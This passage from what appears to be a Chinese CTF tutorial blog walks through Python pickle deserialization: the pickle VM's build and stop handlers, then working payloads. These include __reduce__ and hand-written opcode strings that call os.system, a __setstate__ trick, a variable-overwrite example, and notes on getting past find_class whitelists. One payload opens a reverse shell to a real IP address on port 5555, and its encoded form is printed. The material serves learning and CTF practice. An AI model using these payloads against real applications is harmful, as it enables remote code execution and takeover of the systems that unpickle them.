<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">def</span> <span class="title function_">load_build</span>(<span class="params">self</span>):</span><br><span class="line">        stack = self.stack</span><br><span class="line">        state = stack.pop() <span class="comment">#&#123;&quot;people&quot;:&quot;lituer&quot;&#125;</span></span><br><span class="line">        inst = stack[-<span class="number">1</span>] <span class="comment">#(对象)</span></span><br><span class="line">        setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>) </span><br><span class="line">        <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: </span><br><span class="line">            <span class="comment">#检查是否存在 __setstate__ 方法 一般是不存在的</span></span><br><span class="line">            <span class="comment">###############################################</span></span><br><span class="line">            setstate(state) <span class="comment">###########会造成任意函数调用</span></span><br><span class="line">            <span class="comment">############################################</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        slotstate = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">            state, slotstate = state</span><br><span class="line">        <span class="keyword">if</span> state:</span><br><span class="line">            inst_dict = inst.__dict__</span><br><span class="line">            intern = sys.intern</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                    inst_dict[intern(k)] = v</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    inst_dict[k] = v</span><br><span class="line">        <span class="keyword">if</span> slotstate:</span><br><span class="line">            <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">                <span class="built_in">setattr</span>(inst, k, v)</span><br><span class="line">    dispatch[BUILD[<span class="number">0</span>]] = load_build</span><br><span class="line">self=&amp;gt; stack:[(拥有数据的对象)</span><br></pre></td></tr></table></figure>

<p>所以最后栈顶的内容就是反序列化后的内容</p>
<p><code>.</code></p>
<p>结束反序列化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_stop</span>(<span class="params">self</span>):</span><br><span class="line">    value = self.stack.pop()</span><br><span class="line">    <span class="keyword">raise</span> _Stop(value)</span><br><span class="line">dispatch[STOP[<span class="number">0</span>]] = load_stop</span><br></pre></td></tr></table></figure>

<p><strong>至此整个反序列化过程结束，相信到此为止PVM的工作原理有了一个明确的了解</strong></p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__"></a><code>__reduce__</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">zIxyd</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">&quot;whoami&quot;</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,)</span><br><span class="line"></span><br><span class="line">payload = zIxyd()</span><br><span class="line">serialze = pickle.dumps(payload)</span><br><span class="line">base64_data = base64.b64encode(serialze)</span><br><span class="line"><span class="built_in">print</span>(base64_data)</span><br><span class="line">pickle.loads(serialze)</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;gASVHgAAAAAAAACMAm50lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=&#x27;</span></span><br><span class="line"><span class="comment">#king\24603</span></span><br></pre></td></tr></table></figure>

<p>注意：部分Linux系统下和Windows下的opcode字节流并不兼容，比如Windows下执行系统命令函数为<code>nt.system()</code>，在部分Linux下则为<code>posix.system()</code>;</p>
<p>用<code>eval</code>函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">zIxyd</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;/bin/bash -c \&quot;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5555 0&gt;&amp;1\&quot;&#x27;)&quot;</span>,))</span><br><span class="line">payload = zIxyd()</span><br><span class="line">pickle_a = pickle.dumps(payload)</span><br><span class="line">encoded_data = base64.b64encode(pickle_a)</span><br><span class="line"><span class="built_in">print</span>(encoded_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gASVbwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxTX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJy9iaW4vYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC84MS43MS4xMy43Ni81NTU1IDA+JjEiJymUhZRSlC4=</span></span><br></pre></td></tr></table></figure>

<h4 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h4><p>可以调用函数的操作码：</p>
<p><code>R</code></p>
<p>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>i</code></p>
<p>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>o</code></p>
<p>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>b+__setstate__()</code></p>
<p><code>b</code>操作码对应的是<code>load_build</code>函数; 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</p>
<p>源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_build</span>(<span class="params">self</span>):</span><br><span class="line">    stack = self.stack</span><br><span class="line">    state = stack.pop()</span><br><span class="line">    <span class="comment"># 获取栈的倒数第二个元素赋值给inst</span></span><br><span class="line">    inst = stack[-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 获取inst对象的__setstate__属性</span></span><br><span class="line">    setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>: </span><br><span class="line">            <span class="comment">#检查是否存在 __setstate__ 方法 一般是不存在的</span></span><br><span class="line">            <span class="comment">###############################################</span></span><br><span class="line">            setstate(state) <span class="comment">###########会造成任意函数调用   //</span></span><br><span class="line">            <span class="comment">############################################</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    slotstate = <span class="literal">None</span></span><br><span class="line">    <span class="comment"># 如果state是元组类型并且长度为2，将其分解为state和slotstate</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">        state, slotstate = state</span><br><span class="line">        <span class="comment">##如果&quot;__setstate__&quot;为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并</span></span><br><span class="line">    <span class="keyword">if</span> state:</span><br><span class="line">        inst_dict = inst.__dict__</span><br><span class="line">        intern = sys.intern</span><br><span class="line">        <span class="comment"># 遍历state字典，将键名intern后赋值给inst_dict，键值直接赋值</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                inst_dict[intern(k)] = v</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                inst_dict[k] = v</span><br><span class="line">    <span class="comment"># 如果slotstate不为空，遍历slotstate字典，并将其键值对赋值给inst对象</span></span><br><span class="line">    <span class="keyword">if</span> slotstate:</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">            <span class="built_in">setattr</span>(inst, k, v)</span><br><span class="line">dispatch[BUILD[<span class="number">0</span>]] = load_build</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__setstate__ ： 官方文档中，如果想要存储对象的状态，就可以使用__getstat__和__setstat__方法。由于 pickle 同样可以存储对象属性的状态，所以这两个魔术方法主要是针对那些不可被序列化的状态，如一个被打开的文件句柄open(file,&#x27;r&#x27;)。</span><br></pre></td></tr></table></figure>

<p>和他成对的还有 <code>__getstate__</code> ，被反序列化时调用<code>__setstate__</code>，被序列化时调用<code>__getstate__</code>。重写时可以省略<code>__setstate__</code>，但<code>__getstate__</code>必须返回一个字典。如果<code>__getstate__</code>与<code>__setstate__</code>都被省略, 那么就默认自动保存和加载对象的属性字典<code>__dict__</code>。</p>
<p>目的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当前对象存在属性<span class="string">&#x27;__setstate__&#x27;</span>，并且&#123;<span class="string">&#x27;__setstate__&#x27;</span>: os.system&#125;</span><br></pre></td></tr></table></figure>

<p>第一种来自参考中的博客；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,age</span>):</span><br><span class="line">        self.age=age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Person</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o&#125;(S&quot;__setstate__&quot;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;whoami&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br><span class="line">p=pickle.loads(opcode)</span><br><span class="line"><span class="comment">#whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># o 寻找栈中的上一个MARK,以之间的第一个数据(必须为函数)为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</span></span><br><span class="line"><span class="comment"># u 寻找栈中的上一个MARK,组合之间的数据(数据必须有偶数个,即呈key-value)并全部添加或更新到该MARK之前的一个元素(必须为字典)中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#我把他翻译成人可以看懂的了。如下</span></span><br><span class="line"><span class="comment"># __import__(&quot;__main__&quot;).Person(18).__setstate__ = __import__(&#x27;os&#x27;)</span></span><br><span class="line"><span class="comment">#但是可以看到还是用到了o操作码</span></span><br></pre></td></tr></table></figure>

<p>我自己根据上一个payload，进行了一点改造；利用<code>\x81</code>返回一个Person对象；这样就不需要用到<code>o</code>操作码了；<code>\x81</code>在opcode源码分析有详细讲</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,age</span>):</span><br><span class="line">        self.age=age</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">Person</span></span><br><span class="line"><span class="string">)\x81&#125;(S&quot;__setstate__&quot;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;whoami&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p=pickle.loads(opcode)</span><br></pre></td></tr></table></figure>

<p>其实我还在一篇博客中看到另一种办法，只不过对于初学者的我来说，并没有完全看懂，先记录下来</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">Person</span></span><br><span class="line"><span class="string">)\x81&#125;X\x0C\x00\x00\x00__setstate__cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">sbX\x06\x00\x00\x00whoamib.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#字符c，往后读取两行，得到主函数和类，__main__.tttang</span></span><br><span class="line"><span class="comment">#字符)，向栈中压入空元祖()</span></span><br><span class="line"><span class="comment">#字符&#125;，向栈中压入空字典&#123;&#125;</span></span><br><span class="line"><span class="comment">#字符X，读取四位\x0C\x00\x00\x00__setstate__,得到__setstate__</span></span><br><span class="line"><span class="comment">#字符c，向后读取两行，得到函数os.system</span></span><br><span class="line"><span class="comment">#字符s，将第一个和第二个元素作为键值对，添加到第三个元素中，此时也就是&#123;__main.tttang:()&#125;，__setstate__,os.system</span></span><br><span class="line"><span class="comment">#字符b，第一个元素出栈，此时也就是&#123;&#x27;__setstate__&#x27;: os.system&#125;,此时执行一次setstate(state)</span></span><br><span class="line"><span class="comment">#字符X，往后读取四位x06\x00\x00\x00whoami，即whoami</span></span><br><span class="line"><span class="comment">#字符b，弹出元素whoami此时state为whoami，执行os.system(whoami)</span></span><br><span class="line"><span class="comment">#字符.，结束反序列化</span></span><br></pre></td></tr></table></figure>

<p>当然，思路是天马行空的，利用<code>b</code>操作码执行命令肯定不止这几种payload；</p>
<p><code>\x81</code></p>
<p>我个人感觉<code>\x81</code>操作码，在导入危险模块(比如builtins)情况下，也可以利用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__builtin__</span></span><br><span class="line"><span class="string">map</span></span><br><span class="line"><span class="string">p0</span></span><br><span class="line"><span class="string">0(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tp1</span></span><br><span class="line"><span class="string">0(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">g1</span></span><br><span class="line"><span class="string">tp2</span></span><br><span class="line"><span class="string">0g0</span></span><br><span class="line"><span class="string">g2</span></span><br><span class="line"><span class="string">\x81p3</span></span><br><span class="line"><span class="string">0c__builtin__</span></span><br><span class="line"><span class="string">bytes</span></span><br><span class="line"><span class="string">p4</span></span><br><span class="line"><span class="string">(g3</span></span><br><span class="line"><span class="string">t\x81.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"></span><br><span class="line"><span class="comment">#__import__(&quot;builtins&quot;).bytes.__new__(__import__(&quot;builtins&quot;).bytes,__import__(&quot;builtins&quot;).map.__new__(__import__(&quot;builtins&quot;).map,os.system,(&#x27;whoami&#x27;,)))</span></span><br></pre></td></tr></table></figure>

<h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><h4 id="reduce-1"><a href="#reduce-1" class="headerlink" title="__reduce__"></a><code>__reduce__</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">key1 = <span class="string">b&#x27;321&#x27;</span></span><br><span class="line">key2 = <span class="string">b&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">zIxyd</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span>,))</span><br><span class="line"></span><br><span class="line">payload = zIxyd()</span><br><span class="line">pickle_a = pickle.dumps(payload)</span><br><span class="line"><span class="built_in">print</span>(pickle_a)</span><br><span class="line">pickle.loads(pickle_a)</span><br><span class="line"><span class="built_in">print</span>(key1, key2)</span><br></pre></td></tr></table></figure>

<h4 id="opcode-1"><a href="#opcode-1" class="headerlink" title="opcode"></a>opcode</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#secret.py</span></span><br><span class="line">name = <span class="string">&quot;zIxyd&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secret:&quot;</span>+secret.name)</span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Hacker&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line">result = pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(result.name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#secret:zIxyd</span></span><br><span class="line"><span class="comment">#Hacker</span></span><br></pre></td></tr></table></figure>

<h4 id="实例化对象"><a href="#实例化对象" class="headerlink" title="实例化对象"></a>实例化对象</h4><p>实例化对象是一种特殊的函数执行，这里简单的使用 <code>R</code> 构造一下，其他方式类似：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">Student</span></span><br><span class="line"><span class="string">(S&#x27;XiaoMing&#x27;</span></span><br><span class="line"><span class="string">S&quot;20&quot;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a=pickle.loads(data)</span><br><span class="line"><span class="built_in">print</span>(a.name,a.age)</span><br></pre></td></tr></table></figure>

<h2 id="pickle-Unpickler-find-class"><a href="#pickle-Unpickler-find-class" class="headerlink" title="pickle.Unpickler.find_class()"></a>pickle.Unpickler.find_class()</h2><p>由于官方针对pickle的安全问题的建议是修改<code>find_class()</code>，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如何绕过该函数很重要。<br>什么时候会调用<code>find_class()</code>：</p>
<ol>
<li>从opcode角度看，当出现<code>c</code>、<code>i</code>、<code>b&#39;\x93&#39;</code>时，会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。</li>
<li>从python代码来看，<code>find_class()</code>只会在解析opcode时调用一次，所以只要绕过opcode执行过程，<code>find_class()</code>就不会再调用，也就是说<code>find_class()</code>只需要过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过<code>__import__</code>绕过一些黑名单。</li>
</ol>
<p>下面先看两个例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">safe_builtins = &#123;<span class="string">&#x27;range&#x27;</span>,<span class="string">&#x27;complex&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;frozenset&#x27;</span>,<span class="string">&#x27;slice&#x27;</span>,&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %(module, name))</span><br></pre></td></tr></table></figure>

 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>: <span class="comment"># 只允许__main__模块</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br></pre></td></tr></table></figure>

<ul>
<li><p>第一个例子是官方文档中的例子，使用白名单限制了能够调用的模块为<code>&#123;&#39;range&#39;,&#39;complex&#39;,&#39;set&#39;,&#39;frozenset&#39;,&#39;slice&#39;,&#125;</code>。</p>
</li>
<li><p>第二个例子是高校战疫网络安全分享赛·webtmp中的过滤方法，只允许<code>__main__</code>模块。虽然看起来很安全，但是被引入主程序的模块都可以通过<code>__main__</code>调用修改，所以造成了变量覆盖。</p>
</li>
</ul>
<p>由这两个例子我们了解到，对于开发者而言，使用白名单谨慎列出安全的模块则是规避安全问题的方法；而如何绕过<code>find_class</code>函数内的限制就是pickle反序列化解题的关键。<br>此外，CTF中的考察点往往还会结合python的基础知识（往往是内置的模块、属性、函数）进行，考察对白名单模块的熟悉程度，所以做题的时候可以先把白名单模块的文档看一看:)</p>
